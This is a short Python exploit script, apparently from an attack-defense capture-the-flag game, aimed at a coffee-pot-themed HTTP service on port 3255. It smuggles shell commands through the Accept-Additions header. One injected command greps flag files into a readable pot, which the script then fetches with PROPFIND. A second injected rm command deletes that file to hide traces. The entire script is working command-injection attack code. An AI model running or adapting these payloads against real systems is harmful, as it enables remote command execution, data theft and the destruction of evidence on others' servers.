import requests
import sys
import random

host = sys.argv[1]

pot_id = str(random.randrange(10**10, 10**20))
pot2_id = "7392"

uri = "http://%s:3255/pot-%s" % (host,pot_id)
uri2 = "http://%s:3255/pot-%s" % (host,pot2_id)

# put a posion in rum and place it to the pot
payload = "Rum:a[$(cat pots/* |grep Flag > pots/pot-%s)]" % pot2_id
headers = {"Accept-Additions": payload}

resp = requests.post(uri, headers=headers)
print(resp.status_code, resp.text)

headers = {"Addition": "Rum"}

# activate poison
resp = requests.put(uri, headers=headers)
print(resp.status_code, resp.text)

# see the result
resp = requests.request("PROPFIND", uri2)
print(resp.status_code, resp.text)

#############
# hide traces
pot_id = str(random.randrange(10**10, 10**20))
uri = "http://%s:3255/pot-%s" % (host,pot_id)

payload = "Rum:a[$(rm pots/pot-%s)]" % pot2_id
headers = {"Accept-Additions": payload}

resp = requests.post(uri, headers=headers)
print(resp.status_code, resp.text)

headers = {"Addition": "Rum"}
# drink poison
resp = requests.put(uri, headers=headers)
print(resp.status_code, resp.text)
